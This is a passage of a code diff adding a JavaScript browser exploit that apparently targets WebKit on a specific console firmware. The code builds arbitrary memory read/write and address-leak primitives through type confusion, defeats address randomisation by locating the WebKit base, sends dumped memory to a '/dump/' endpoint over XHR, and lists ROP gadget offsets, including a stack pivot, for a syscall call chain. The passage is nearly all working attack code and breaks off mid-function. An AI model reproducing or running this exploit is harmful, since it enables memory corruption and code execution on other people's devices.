+        "LOAD-THREW": 1, "SETUP-THREW": 1, "ADDROF-NO-RESULT": 1
+    };
+    var STOP_NO_RETRY = { "UNSUPPORTED": 1 };
+    var origMark = mark;
+    mark = function (tag, extra) {
+        origMark(tag, extra);
+        try {
+            if (passSeen || scheduled)
+                return;
+            if (tag === "GENUINE-U8-RW-PASS") {
+                passSeen = true;
+                return;
+            }
+            if (STOP_NO_RETRY[tag])
+                return;
+            if (TERMINAL_MISS[tag]) {
+                var next = tryIdx + 1;
+                if (next >= R3_AUTO_LADDER.length) {
+                    origMark("AUTO-EXHAUSTED",
+                        "tries=" + R3_AUTO_LADDER.length
+                        + "-action=fermer-rouvrir-navigateur-puis-recharger");
+                    return;
+                }
+                var nNext = R3_AUTO_LADDER[next];
+                scheduled = true;
+                origMark("AUTO-NEXT", "try=" + next + "-n=" + nNext
+                    + "-in=" + R3_AUTO_DELAY_MS + "ms");
+                setTimeout(function () {
+                    try { sessionStorage.setItem("r3expect", String(next)); } catch (_) {}
+                    location.replace("kex-aio.html?n=" + nNext + "&try=" + next + r3SlotsKeep());
+                }, R3_AUTO_DELAY_MS);
+            }
+        } catch (_) {}
+    };
+})();
+
+var driverState = {
+    candidate: null,
+    rwView: null,
+    fakeAddr: NaN,
+    hostAddr: NaN,
+    targetView: null,
+    origHeader: null,
+    origVector: NaN
+};
+
+var r3C = null;
+var r3Done = false;
+var r3Arms = 0;
+var r3OutTags = new Array(R3_OUT_MAX);
+var r3OutExtras = new Array(R3_OUT_MAX);
+var r3OutLo = 0;
+var r3OutHi = 0;
+var r3CaptureWords = new Uint16Array(16);
+var r3DumpBytes = 0;
+var r3DumpChunks = 0;
+
+function r3Log(tag, extra) {
+    if (r3OutHi >= R3_OUT_MAX) return;
+    r3OutTags[r3OutHi] = tag;
+    r3OutExtras[r3OutHi] = (extra === undefined ? "" : extra);
+    r3OutHi++;
+}
+
+function r3RestoreCarrier() {
+    for (var i = 0; i < 8; ++i)
+        r3C[0x18 + i] = rwHeader[0x18 + i];
+    for (var j = 0; j < 8; ++j)
+        r3C[0x10 + j] = rwHeader[0x10 + j];
+}
+
+function r3Flush() {
+    r3RestoreCarrier();
+    while (r3OutLo < r3OutHi) {
+        var t = r3OutTags[r3OutLo];
+        var e = r3OutExtras[r3OutLo];
+        if (e === "")
+            mark(t);
+        else
+            mark(t, e);
+        r3OutLo++;
+    }
+}
+
+function ext_arm(target_addr) {
+    var hi = Math.floor(target_addr / 0x100000000);
+    scratchWords[0] = target_addr - hi * 0x100000000;
+    scratchWords[1] = hi;
+    for (var i = 0; i < 8; ++i)
+        r3C[0x10 + i] = scratchBytes[i];
+    r3Arms++;
+}
+
+function ext_read8(addr) {
+    ext_arm(addr);
+    return rwView[0];
+}
+
+function ext_read32(addr) {
+    ext_arm(addr);
+    return rwView[0]
+        + rwView[1] * 0x100
+        + rwView[2] * 0x10000
+        + rwView[3] * 0x1000000;
+}
+
+function ext_read64(addr) {
+    ext_arm(addr);
+    return rwView[0]
+        + rwView[1] * 0x100
+        + rwView[2] * 0x10000
+        + rwView[3] * 0x1000000
+        + rwView[4] * 0x100000000
+        + rwView[5] * 0x10000000000;
+}
+
+function ext_write8(addr, val) {
+    ext_arm(addr);
+    rwView[0] = val & 0xff;
+}
+
+function ext_write32(addr, val) {
+    ext_arm(addr);
+    rwView[0] = val & 0xff;
+    rwView[1] = (val >>> 8) & 0xff;
+    rwView[2] = (val >>> 16) & 0xff;
+    rwView[3] = (val >>> 24) & 0xff;
+}
+
+function ext_write64(addr, val) {
+    var hi = Math.floor(val / 0x100000000);
+    var lo = val - hi * 0x100000000;
+    ext_arm(addr);
+    rwView[0] = lo & 0xff;
+    rwView[1] = (lo >>> 8) & 0xff;
+    rwView[2] = (lo >>> 16) & 0xff;
+    rwView[3] = (lo >>> 24) & 0xff;
+    rwView[4] = hi & 0xff;
+    rwView[5] = (hi >>> 8) & 0xff;
+    rwView[6] = (hi >>> 16) & 0xff;
+    rwView[7] = (hi >>> 24) & 0xff;
+}
+
+function ext_addrof(obj) {
+    var save0 = getterCarrier[0];
+    var save2 = getterCarrier[2];
+    getterCarrier[0] = obj;
+    getterCarrier[2] = obj;
+    var result = NaN;
+    try {
+        var s = symbolToString.call(preparedSymbolObject);
+        if (typeof s === "string" && s.length >= 23) {
+            for (var i = 0; i < 16; ++i)
+                r3CaptureWords[i] = s.charCodeAt(7 + i);
+            var a0 = pointerFromWords(r3CaptureWords, 0);
+            var a1 = pointerFromWords(r3CaptureWords, 8);
+            var b0 = pointerFromWords(r3CaptureWords, 4);
+            if (a0 === a1 && a0 !== b0 && plausibleCell(a0))
+                result = a0;
+        }
+    } catch (_) {
+        result = NaN;
+    }
+    getterCarrier[0] = save0;
+    getterCarrier[2] = save2;
+    return result;
+}
+
+function r3DumpRange(name, start, len) {
+    var off = 0;
+    while (off < len) {
+        var n = Math.min(len - off, R3_DUMP_CHUNK);
+        var s = "";
+        for (var i = 0; i < n; ++i) {
+            var b = ext_read8(start + off + i);
+            s += (b < 16 ? "0" : "") + b.toString(16);
+        }
+        r3Log("LEAK-DUMP", "name=" + name
+            + "-off=0x" + (start + off).toString(16)
+            + "-len=" + n);
+        try {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", "/dump/" + name + "/"
+                + off.toString(16) + "/" + s, true);
+            xhr.send();
+        } catch (_) {}
+        r3DumpBytes += n;
+        r3DumpChunks++;
+        off += n;
+    }
+}
+
+function r3DumpLiveCell(name, cellAddr, pre, post) {
+    if (!plausibleCell(cellAddr))
+        return;
+    if (pre > R3_WIN) pre = R3_WIN;
+    if (post > R3_WIN) post = R3_WIN;
+    r3DumpRange(name, cellAddr - pre, pre + post);
+}
+
+function r3TypeByte(addr) {
+    return ext_read8(addr + 0x05);
+}
+
+function r3Sid(addr) {
+    return ext_read32(addr);
+}
+
+function r3ProbeExe(fnName, from, cand) {
+    if (!plausibleCell(cand)) {
+        r3Log("LEAK-EXE-PROBE", "fn=" + fnName + "-" + from
+            + "-cand=" + hex(cand) + "-verdict=implausible");
+        return null;
+    }
+    var tb = r3TypeByte(cand);
+    if (tb !== 8) {
+        r3Log("LEAK-EXE-PROBE", "fn=" + fnName + "-" + from
+            + "-cand=" + hex(cand)
+            + "-type=0x" + tb.toString(16)
+            + "-verdict=not-native-executable");
+        return null;
+    }
+    var sid = r3Sid(cand);
+    var s10 = ext_read64(cand + 0x10);
+    var s18 = ext_read64(cand + 0x18);
+    var s20 = ext_read64(cand + 0x20);
+    var s28 = ext_read64(cand + 0x28);
+    var s30 = ext_read64(cand + 0x30);
+    var s18b = ext_read64(cand + 0x18);
+    var s28b = ext_read64(cand + 0x28);
+    var s30b = ext_read64(cand + 0x30);
+    var repeated = (s18 === s18b && s28 === s28b && s30 === s30b);
+    var sidOK = sid >= 0x100 && sid < 0x08000000;
+    var fields = plausibleCell(s28) && plausibleCell(s30) && s28 !== s30;
+    var sceneOK = sidOK && fields && repeated;
+    var tramp = plausibleCell(s18) && (s18 % 0x4000) === R3_TRAMP_RES;
+    r3Log("LEAK-CHAIN-EXE", "fn=" + fnName + "-" + from
+        + "-P=" + hex(cand)
+        + "-typeByte=8"
+        + "-sid=" + hex(sid)
+        + "-s10=" + hex(s10)
+        + "-s18=" + hex(s18)
+        + "-s18res=0x" + (s18 % 0x4000).toString(16)
+        + "-s20=" + hex(s20)
+        + "-s28=" + hex(s28)
+        + "-s30=" + hex(s30)
+        + "-repeated=" + (repeated ? 1 : 0)
+        + "-s18tramp=" + (tramp ? "pass" : "fail")
+        + "-sceneGate=" + (sceneOK ? "PASS" : "FAIL"));
+    return { exe: cand, from: from, sid: sid, s10: s10, s18: s18,
+             s20: s20, s28: s28, s30: s30, repeated: repeated,
+             sceneOK: sceneOK, tramp: tramp };
+}
+
+function r3BigFree() {
+    try {
+        fillerGraph = null;
+        outerGraph = null;
+        referenceTarget = null;
+        r3Log("LEAK-BIG-FREED", "stage1-graph-released-no-pressure");
+        r3Flush();
+    } catch (_) {}
+}
+
+function r3Main() {
+    r3Log("LEAK-BOOT", "rev=" + R3_REVISION
+        + "-scene=relapse_1352-slopkit-core-1"
+        + "-scene-cadence=50/100ms-stage1-cadence=" + CAPTURE_DELAY_MS
+        + "/" + COMPOSE_DELAY_MS + "ms"
+        + "-expm1-rva=0x" + R3_WK_EXPM1_BUILTIN.toString(16)
+        + "-parseint-rva=0x" + R3_PARSEINT_RVA.toString(16)
+        + "-mf-off=0x" + R3_WK_JSFUNCTION_M_FUNCTION.toString(16)
+        + "-door=pair-delta-0x" + R3_PAIR_DELTA.toString(16)
+        + "-region=>>" + R3_REGION_SHIFT
+        + "-s18=non-blocking-info");
+    r3Flush();
+
+    var anchorElement = document.createElement("textarea");
+    var markerA = { marker: 0x4d41524b, kind: "probe-marker-a" };
+    var markerB = { marker: 0x4d41524c, kind: "probe-marker-b" };
+    var guardA = { marker: 0x484f4c44 };
+    var guardB = { marker: 0x47554152 };
+    var holder = {
+        q0: parseInt,
+        q1: anchorElement,
+        q2: markerA,
+        q3: markerB,
+        q4: guardA,
+        q5: guardB
+    };
+    if (holder.q0 !== parseInt || holder.q2 !== markerA)
+        throw new Error("holder-shape-failed");
+
+    var selfAddr = ext_addrof(fakeHost);
+    var selfOK = selfAddr === hostAddress;
+    r3Log("LEAK-ADDROF-SELFTEST", "leak=" + hex(selfAddr)
+        + "-expected=" + hex(hostAddress)
+        + "-" + (selfOK ? "PASS" : "FAIL"));
+    r3Flush();
+    var holderAddr = ext_addrof(holder);
+    if (!plausibleCell(holderAddr)) {
+        r3Log("LEAK-LEAK-ADDROF-FAIL", "holder=" + hex(holderAddr)
+            + "-action=clean-stop-no-live-address-available");
+        return "LEAK-ADDROF-FAIL";
+    }
+    r3Log("LEAK-SCENE-HOLDER", "addr=" + hex(holderAddr)
+        + "-forme=core.js:641-648-q0=parseInt-q2=markerA"
+        + "-leakSlot=0x" + (holderAddr + 0x20).toString(16)
+        + "(=holder+0x10+8*2-as-leakval-mem.js:182)");
+    r3DumpLiveCell("holder", holderAddr, R3_WIN, R3_WIN);
+    r3Flush();
+
+    var P = ext_read64(holderAddr + 0x10);
+    r3Log("LEAK-SCENE-SLOT", "slot=q0-addr=" + hex(holderAddr + 0x10)
+        + "-value=" + hex(P)
+        + "-(leur-nativeTargetAddress=low48At(holderHeader,0x10))");
+    if (!plausibleCell(P)) {
+        r3Log("LEAK-LEAK-SLOT-FAIL", "parseInt-implausible-by-slot"
+            + "-action=clean-stop-holder-already-dumped");
+        return "LEAK-SLOT-FAIL";
+    }
+    var pSid = r3Sid(P);
+    var pType = r3TypeByte(P);
+    var q08 = ext_read64(P + 0x08);
+    var q10 = ext_read64(P + 0x10);
+    var q18 = ext_read64(P + 0x18);
+    var q20 = ext_read64(P + 0x20);
+    r3Log("LEAK-CHAIN-FUNC", "fn=parseInt-slot-P=" + hex(P)
+        + "-sid=" + hex(pSid)
+        + "-type=0x" + pType.toString(16)
+        + "-q08=" + hex(q08)
+        + "-q10=" + hex(q10)
+        + "-q18=" + hex(q18)
+        + "-q20=" + hex(q20));
+    r3Flush();
+    r3DumpLiveCell("jsfn-parseint", P, R3_WIN, R3_WIN);
+    if (plausibleCell(q10))
+        r3DumpLiveCell("scope-parseint", q10, R3_WIN, R3_WIN);
+    var exeFromSlot = null;
+    var cand18 = r3ProbeExe("parseInt", "+0x18", q18);
+    if (cand18) {
+        r3DumpLiveCell("exe-parseint-18", cand18.exe, R3_WIN, R3_WIN);
+        if (cand18.sceneOK) exeFromSlot = cand18;
+    }
+    if (!exeFromSlot) {
+        var cand10 = r3ProbeExe("parseInt", "+0x10", q10);
+        if (cand10) {
+            r3DumpLiveCell("exe-parseint-10", cand10.exe, R3_WIN, R3_WIN);
+            if (cand10.sceneOK) exeFromSlot = cand10;
+        }
+    }
+    r3Flush();
+
+    holder.q2 = Math.expm1;
+    var E = ext_read64(holderAddr + 0x20);
+    holder.q2 = markerA;
+    r3Log("LEAK-SCENE-LEAK", "step=addrof-expm1-par-slot"
+        + "-slot=q2-addr=" + hex(holderAddr + 0x20)
+        + "-cell=" + hex(E)
+        + "-(jb.js:320-p.leakval(Math.expm1))");
+    var exeE = null;
+    var s28e = NaN;
+    var e18 = NaN;
+    if (plausibleCell(E)) {
+        r3DumpLiveCell("jsfn-expm1-scene", E, R3_WIN, R3_WIN);
+        var eq18 = ext_read64(E + 0x18);
+        var eq10 = ext_read64(E + 0x10);
+        r3Log("LEAK-SCENE-LEAK", "step=exe-par-+0x18"
+            + "-cand18=" + hex(eq18)
+            + "-cand10=" + hex(eq10));
+        var ec18 = r3ProbeExe("expm1-scene", "+0x18", eq18);
+        var ec10 = r3ProbeExe("expm1-scene", "+0x10", eq10);
+        if (ec18) {
+            r3DumpLiveCell("exe-expm1-scene-18", ec18.exe, R3_WIN, R3_WIN);
+            exeE = ec18;
+        } else if (ec10) {
+            r3DumpLiveCell("exe-expm1-scene-10", ec10.exe, R3_WIN, R3_WIN);
+            exeE = ec10;
+        }
+        if (exeE) {
+            e18 = exeE.s18;
+            s28e = exeE.s28;
+            r3Log("LEAK-SCENE-LEAK", "step=nativeFn"
+                + "-s28e=" + hex(s28e)
+                + "-residu=0x" + (s28e % 0x4000).toString(16)
+                + "-(jb.js:324-webkitBase=nativeFn-0x"
+                + R3_WK_EXPM1_BUILTIN.toString(16) + ")");
+        }
+    } else {
+        r3Log("LEAK-SCENE-LEAK", "step=addrof-expm1-par-slot-FAIL"
+            + "-cell=" + hex(E) + "-implausible");
+    }
+    r3Flush();
+
+    var E2 = ext_addrof(Math.expm1);
+    r3Log("LEAK-OURS-EXPM1", "cell=" + hex(E2)
+        + "-(our-ext_addrof-symbol-reconfusion)");
+    var exeO = null;
+    if (plausibleCell(E2)) {
+        r3DumpLiveCell("jsfn-expm1-ours", E2, R3_WIN, R3_WIN);
+        var oq18 = ext_read64(E2 + 0x18);
+        var oq10 = ext_read64(E2 + 0x10);
+        var oc18 = r3ProbeExe("expm1-ours", "+0x18", oq18);
+        var oc10 = r3ProbeExe("expm1-ours", "+0x10", oq10);
+        if (oc18) {
+            r3DumpLiveCell("exe-expm1-ours-18", oc18.exe, R3_WIN, R3_WIN);
+            exeO = oc18;
+        } else if (oc10) {
+            r3DumpLiveCell("exe-expm1-ours-10", oc10.exe, R3_WIN, R3_WIN);
+            exeO = oc10;
+        }
+    }
+    var sameCell = (plausibleCell(E) && plausibleCell(E2) && E === E2);
+    var sameS28 = !!(exeE && exeO
+        && exeE.exe === exeO.exe && exeE.s28 === exeO.s28);
+    r3Log("LEAK-SCENE-VS-OURS", "slot=" + hex(E)
+        + "-addrof=" + hex(E2)
+        + "-sameCell=" + (sameCell ? 1 : 0)
+        + "-sameS28=" + (sameS28 ? 1 : 0)
+        + "-(if-sameCell=1-state-B-is-not-an-addrof-artifact)");
+    r3Flush();
+
+    var verdict = "LEAK-RAN";
+    var s28p = exeFromSlot ? exeFromSlot.s28 : NaN;
+
+    var tE = exeE ? (exeE.s18 % 0x4000) : NaN;
+    var tP = exeFromSlot ? (exeFromSlot.s18 % 0x4000) : NaN;
+    r3Log("LEAK-S18-INFO", "s18e=" + (exeE ? hex(exeE.s18) : "none")
+        + "-res=0x" + (isFinite(tE) ? tE.toString(16) : "none")
+        + "-s18p=" + (exeFromSlot ? hex(exeFromSlot.s18) : "none")
+        + "-res=0x" + (isFinite(tP) ? tP.toString(16) : "none")
+        + "-trampoline=" + (tE === R3_TRAMP_RES && tP === R3_TRAMP_RES
+            ? "warm-full-boot" : "cold-boot-allocation-residue")
+        + "-blocking=no");
+
+    if (exeE && exeFromSlot
+        && plausibleCell(s28e) && plausibleCell(s28p)) {
+        var delta = s28e - s28p;
+        var inRange = s28e > R3_S28_MIN && s28e < R3_S28_MAX
+            && s28p > R3_S28_MIN && s28p < R3_S28_MAX;
+        var regionDiv = Math.pow(2, R3_REGION_SHIFT);
+        var regE = Math.floor(s28e / regionDiv);
+        var regP = Math.floor(s28p / regionDiv);
+        var sameRegion = regE === regP;
+        var deltaOK = delta === R3_PAIR_DELTA;
+        var base = s28e - R3_WK_EXPM1_BUILTIN;
+        var aligned = (base % 0x4000) === 0 && base > 0x100000000;
+        var gatePass = deltaOK && inRange && sameRegion && aligned;
+        r3Log("BASE-PAIR-GATE", (gatePass ? "PASS" : "FAIL")
+            + "-s28e=" + hex(s28e)
+            + "-s28p=" + hex(s28p)
+            + "-delta=0x" + delta.toString(16)
+            + "-expected=0x" + R3_PAIR_DELTA.toString(16)
+            + "-range=" + (inRange ? "ok" : "out")
+            + "-region" + R3_REGION_SHIFT + "=0x" + regE.toString(16)
+            + "/0x" + regP.toString(16)
+            + "-" + (sameRegion ? "same" : "different")
+            + "-base=" + hex(base)
+            + "-aligned=" + (aligned ? "0x4000-PASS" : "FAIL"));
+        if (gatePass) {
+            r3Log("BASE-LOCKED", "webkit=" + hex(base)
+                + "-s28e=" + hex(s28e)
+                + "-s28p=" + hex(s28p)
+                + "-delta=0x" + R3_PAIR_DELTA.toString(16)
+                + "-rva-expm1=0x" + R3_WK_EXPM1_BUILTIN.toString(16)
+                + "-rva-parseint=0x" + R3_PARSEINT_RVA.toString(16)
+                + "-aligned=0x4000-PASS-(pair-verified-across-boots)");
+            r3Flush();
+            r3DumpRange("expm1-anchor", base + R3_WK_EXPM1_BUILTIN, 0x100);
+            r3DumpRange("parseint-anchor", base + R3_PARSEINT_RVA, 0x100);
+            r3DumpRange("base-start", base + 0x0, 0x200);
+            r3DumpRange("imp-error", base + R3_WK_IMP_ERROR, 0x100);
+            verdict = "BASE-LOCKED";
+            r4FcallLayer(base, exeE);
+        } else {
+            r3Log("BASE-PAIR-FAIL", "s28e=" + hex(s28e)
+                + "-s28p=" + hex(s28p)
+                + "-delta=0x" + delta.toString(16)
+                + "-expected=0x" + R3_PAIR_DELTA.toString(16)
+                + (!deltaOK ? "-reason=ecart" : "")
+                + (!inRange ? "-reason=plage" : "")
+                + (!sameRegion ? "-reason=region" : "")
+                + (deltaOK && !aligned ? "-reason=alignement" : "")
+                + "-action=clean-refusal-no-module-dump-re-measure");
+            verdict = (deltaOK && !aligned)
+                ? "BASE-UNALIGNED" : "BASE-PAIR-FAIL";
+        }
+    } else {
+        r3Log("BASE-PAIR-GATE", "FAIL-paire-incomplete"
+            + "-s28e=" + (exeE ? hex(s28e) : "none")
+            + "-s28p=" + (exeFromSlot ? hex(s28p) : "none")
+            + "-action=clean-stop-no-module-dump");
+        r3Log("BASE-PAIR-FAIL", "s28e=" + (exeE ? hex(s28e) : "none")
+            + "-s28p=" + (exeFromSlot ? hex(s28p) : "none")
+            + "-reason=missing-side");
+        verdict = (exeE || exeFromSlot)
+            ? "BASE-PAIR-FAIL" : "EXE-NOT-FOUND";
+    }
+    if (verdict !== "BASE-LOCKED")
+        r3Log("FCALL-SKIPPED", "reason=" + verdict
+            + "-pair-door-closed-no-gadget-read-no-write");
+    r3Flush();
+    return verdict;
+}
+
+function leakHook(candidate) {
+    if (r3Done)
+        return;
+    r3Done = true;
+    r3C = candidate;
+    driverState.candidate = candidate;
+    driverState.rwView = rwView;
+    driverState.origHeader = rwHeader;
+    driverState.hostAddr = hostAddress;
+    driverState.fakeAddr = fakeAddress;
+    driverState.targetView = targetView;
+    driverState.origVector = rwOriginalVector;
+    var verdict = "LEAK-INCOMPLETE";
+    try {
+        verdict = r3Main();
+    } catch (error) {
+        r3Log("LEAK-THREW", (error && error.name) + ":"
+            + String(error && error.message).slice(0, 100));
+        verdict = "THREW";
+    }
+    try {
+        r3RestoreCarrier();
+    } catch (_) {
+        r3Log("LEAK-RESTORE-THREW", "manual-review-required");
+    }
+    try {
+        r3Flush();
+    } catch (_) {}
+    try {
+        r3Log("LEAK-CARRIER-STATE", "len=" + rwView.length
+            + "-byte0=0x" + rwView[0].toString(16)
+            + "-mirror0=0x" + rwMirror[0].toString(16)
+            + "-target0=0x" + targetView[0].toString(16)
+            + "-arms=" + r3Arms
+            + "-dumps=" + r3DumpChunks + "chunks/" + r3DumpBytes + "bytes");
+    } catch (_) {}
+    try {
+        r3Flush();
+    } catch (_) {}
+    r3Log("LEAK-DONE", "verdict=" + verdict
+        + "-arms=" + r3Arms
+        + "-dumpBytes=" + r3DumpBytes);
+    try {
+        r3Flush();
+    } catch (_) {}
+    r3C = null;
+    driverState.candidate = null;
+}
+
+var R4_REVISION = "fcall-rop-1";
+
+var R4_GAD = [
+    ["POP_RDI_RET", 0x5c480, [0x5f, 0xc3], "5f c3"],
+    ["POP_RSI_RET", 0x6e45e, [0x5e, 0xc3], "5e c3"],
+    ["POP_RDX_RET", 0x12c5ba, [0x5a, 0xc3], "5a c3"],
+    ["POP_RCX_RET", 0x1bade, [0x59, 0xc3], "59 c3"],
+    ["POP_R8_RET", 0x9b311, [0x41, 0x58, 0xc3], "41 58 c3 (REX-verified, hardened)"],
+    ["POP_R9_RET", 0x1dcfb1, [0x41, 0x59, 0xc3], "41 59 c3 (REX-verified, hardened)"],
+    ["POP_RAX_RET", 0x10504, [0x58, 0xc3], "58 c3"],
+    ["LEAVE_RET", 0x182f7, [0xc9, 0xc3], "c9 c3"],
+    ["MOV_RDI_RAX_RET", 0x548b, [0x48, 0x89, 0x07, 0xc3], "48 89 07 c3"],
+    ["G0", 0x295f948, [0x48, 0x8b, 0x7e, 0x30], "48 8b 7e 30 (mov rdi,[rsi+0x30] ; call ...)"],
+    ["G1", 0x1d989e3, [0x58, 0x48, 0x8b, 0x07], "58 48 8b 07 (pop rax ; mov rax,[rax] ; jmp [rax+0x18])"],
+    ["G2", 0x25bae0, [0x55, 0x48, 0x89, 0xe5], "55 48 89 e5 (push rbp ; mov rbp,rsp ...)"],
+    ["G3", 0x4a0406, [0x48, 0x8b, 0x78, 0x08], "48 8b 78 08 (mov rdi,[rax+8] ; call [rax+0x20])"],
+    ["G4", 0x1ec3ada, [0x48, 0x8b, 0x50, 0x38], "48 8b 50 38 (mov rdx,[rax+0x38] ; call [rax+0x10])"],
+    ["G5", 0x2abccaa, [0x52, 0x5c, 0xc3], "52 5c c3 (push rdx ; pop rsp ; ret)"]
+];
+
+var R4_PIVOT_VIEW_SP = 0x38;
+var R4_PB_SIZE = Math.max(0x28,
+    (R4_PIVOT_VIEW_SP + 8 + 0xf) & ~0xf);
+var R4_AB_M_IMPL = 0x10;
+var R4_AB_M_DATA = 0x10;
+var R4_SYS_GETPID = 20;
+var R4_K_ERROR_1352 = 0x1a0f0;
+var R4_STUB_SEED = 0x2cb70;
+var R4_STUB_WIN1 = 0x8000;
+var R4_STUB_WIN2 = 0x20000;
+var R4_ERRFN_GUARD = 0x30000;
+var R4_READ_TAIL = 0x20;
+var R4_UNDEF_LO = 0x0a, R4_UNDEF_HI = 0xfffffff7;
+var R4_GADGET_DUMP = 0x10;
+
+var R4_GAD_WIN1 = 0x8000;
+var R4_GAD_WIN2 = 0x20000;
+var R4_GAD_MIN_RVA = 0x4000;
+
+var R4_STUB_EXACT_OFF = 0x6cf0;
+var R4_STUB_EXACT_SIG = [0x48, 0xc7, 0xc0, 0x14, 0x00, 0x00, 0x00,
+    0x49, 0x89, 0xca, 0x0f, 0x05];
+var R4_STUB_EXACT_WIN = 0x100;
+
+var R4_KEEP = [];
+var r4DumpBytesTotal = 0;
+var r4DumpChunksTotal = 0;
+
+function r4Hex2(b) {
+    return (b < 16 ? "0" : "") + b.toString(16);
+}
+
+function r4SendDump(name, off, hexstr) {
+    r3Log("FCALL-DUMP", "name=" + name + "-off=0x" + off.toString(16)
+        + "-len=" + (hexstr.length >> 1));
+    try {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "/dump/" + name + "/" + off.toString(16) + "/"
+            + hexstr, true);
+        xhr.send();
+    } catch (_) {}
+    r4DumpBytesTotal += hexstr.length >> 1;
+    r4DumpChunksTotal++;
+}
+
+function r4DumpRange(name, start, len) {
+    var off = 0;
+    while (off < len) {
+        var n = Math.min(len - off, R3_DUMP_CHUNK);
+        var s = "";
+        for (var i = 0; i < n; ++i)
+            s += r4Hex2(ext_read8(start + off + i));
+        r4SendDump(name, off, s);
+        off += n;
+    }
+}
+
+function r4BufAddr(ab) {
+    var c = ext_addrof(ab);
+    if (!plausibleCell(c)) throw new Error("r4-bufaddr-addrof");
+    var impl = ext_read64(c + R4_AB_M_IMPL);
+    if (!plausibleCell(impl)) throw new Error("r4-bufaddr-impl");
+    var data = ext_read64(impl + R4_AB_M_DATA);
+    if (!plausibleCell(data)) throw new Error("r4-bufaddr-data");
+    return data;
+}
+
+function r4BufAddrSelfTest() {
+    var ab = new ArrayBuffer(0x20);
+    var dv = new DataView(ab);
+    R4_KEEP.push(ab, dv);
+    dv.setUint32(0, 0xfeedface, true);
+    dv.setUint32(4, 0x13579bdf, true);
+    var a = r4BufAddr(ab);
+    var v0 = ext_read32(a);
+    var v1 = ext_read32(a + 4);
+    var ok = v0 === 0xfeedface && v1 === 0x13579bdf;
+    r3Log("FCALL-BUFADDR-SELFTEST", (ok ? "PASS" : "FAIL")
+        + "-addr=" + hex(a)
+        + "-lu=" + hex(v0) + "+" + hex(v1)
+        + "-expected=0xfeedface+0x13579bdf-(walk-0x10/0x10-jb.js:431-438)");
+    return ok;
+}
+
+function r4StubWindow(errorFn, half) {
+    var est = errorFn - R4_K_ERROR_1352 + R4_STUB_SEED;
+    var lo = est - half;
+    var hi = est + half;
+    var gLo = errorFn - R4_ERRFN_GUARD + 1;
+    var gHi = errorFn + R4_ERRFN_GUARD - R4_READ_TAIL;
+    if (lo < gLo) lo = gLo;
+    if (hi > gHi) hi = gHi;
+    return { est: est, lo: lo, hi: hi };
+}
+
+function r4IsGetpidStub(addr) {
+    if (ext_read8(addr) !== 0x48) return false;
+    if (ext_read8(addr + 1) !== 0xc7) return false;
+    if (ext_read8(addr + 2) !== 0xc0) return false;
+    if (ext_read8(addr + 3) !== (R4_SYS_GETPID & 0xff)
+        || ext_read8(addr + 4) !== 0
+        || ext_read8(addr + 5) !== 0
+        || ext_read8(addr + 6) !== 0) return false;
+    for (var k = 7; k < 13; ++k)
+        if (ext_read8(addr + k) === 0x49) return true;
+    return false;
+}
+
+function r4ScanStubPattern(lo, hi) {
+    for (var a = lo; a <= hi; ++a) {
+        if (r4IsGetpidStub(a)) return a;
+    }
+    return 0;
+}
+
+function r4IsExactStub(addr) {
+    for (var i = 0; i < R4_STUB_EXACT_SIG.length; ++i)
+        if (ext_read8(addr + i) !== R4_STUB_EXACT_SIG[i]) return false;
+    return true;
+}
+
+function r4StubSigHex() {
+    var s = "";
+    for (var i = 0; i < R4_STUB_EXACT_SIG.length; ++i)
+        s += (i ? "-" : "") + r4Hex2(R4_STUB_EXACT_SIG[i]);
+    return s;
+}
+
+function r4StubFound(w1, addr, window, via) {
+    var delta = addr - w1.est;
+    r3Log("FCALL-STUB-FOUND", "addr=" + hex(addr)
+        + "-window=" + window
+        + "-via=" + via
+        + "-num=" + R4_SYS_GETPID
+        + "-delta-vs-est=" + (delta >= 0 ? "+0x" : "-0x")
+        + Math.abs(delta).toString(16)
+        + "-signature=48-c7-c0-14-00-00-00-49");
+    r3Log("FCALL-LK-INFO", "libkernel-derivee=" + hex(addr - R4_STUB_SEED)
+        + "-(stubFound-0x" + R4_STUB_SEED.toString(16)
+        + "-13.52-reserve-rva-not-guaranteed-on-a-new-build-INFO-no-reads)");
+    return addr;
+}
+
+function r4FindStub(errorFn) {
+    var w1 = r4StubWindow(errorFn, R4_STUB_WIN1);
+    var w2 = null;
+    r3Log("FCALL-STUB-EST", "est=" + hex(w1.est)
+        + "-k-error-1352=0x" + R4_K_ERROR_1352.toString(16)
+        + "-seed20=0x" + R4_STUB_SEED.toString(16)
+        + "-window1=[" + hex(w1.lo) + ".." + hex(w1.hi) + "]"
+        + "-guard=[" + hex(errorFn - R4_ERRFN_GUARD + 1)
+        + ".." + hex(errorFn + R4_ERRFN_GUARD - 1) + "]"
+        + "-(no-scan-reads-inside-the-guard-only)");
+
+    var exact = errorFn + R4_STUB_EXACT_OFF;
+    if (r4IsExactStub(exact)) {
+        r3Log("FCALL-STUB-EXACT", "addr=" + hex(exact)
+            + "-off=+0x" + R4_STUB_EXACT_OFF.toString(16)
+            + "-bytes=" + r4StubSigHex()
+            + "-(offline-measure-getpid-unique-window)");
+        return r4StubFound(w1, exact, 0, "exact");
+    }
+
+    var dLo = exact - R4_STUB_EXACT_WIN;
+    var dHi = exact + R4_STUB_EXACT_WIN;
+    r3Log("FCALL-STUB-EXACT-FAIL", "off=+0x" + R4_STUB_EXACT_OFF.toString(16)
+        + "-bytes-differents-fallback=+-0x" + R4_STUB_EXACT_WIN.toString(16));
+    for (var e = dLo; e <= dHi; ++e) {
+        if (r4IsExactStub(e)) {
+            r3Log("FCALL-STUB-EXACT-WIDEN", "addr=" + hex(e)
+                + "-window=[" + hex(dLo) + ".." + hex(dHi) + "]"
+                + "-delta-vs-exact=" + (e >= exact ? "+0x" : "-0x")
+                + Math.abs(e - exact).toString(16));
+            return r4StubFound(w1, e, 0, "exact-drift");
+        }
+    }
+
+    var addr = r4ScanStubPattern(w1.lo, w1.hi);
+    if (!addr) {
+        w2 = r4StubWindow(errorFn, R4_STUB_WIN2);
+        r3Log("FCALL-STUB-WIDEN", "window2=[" + hex(w2.lo) + ".."
+            + hex(w2.hi) + "]-(single-widening-+-0x"
+            + R4_STUB_WIN2.toString(16) + "-clamped-by-the-guard)");
+        addr = r4ScanStubPattern(w2.lo, w2.hi);
+    }
+    if (!addr) {
+        r3Log("FCALL-STUB-FAIL", "errorFn=" + hex(errorFn)
+            + "-exact=+0x" + R4_STUB_EXACT_OFF.toString(16)
+            + "-window1=[" + hex(w1.lo) + ".." + hex(w1.hi) + "]"
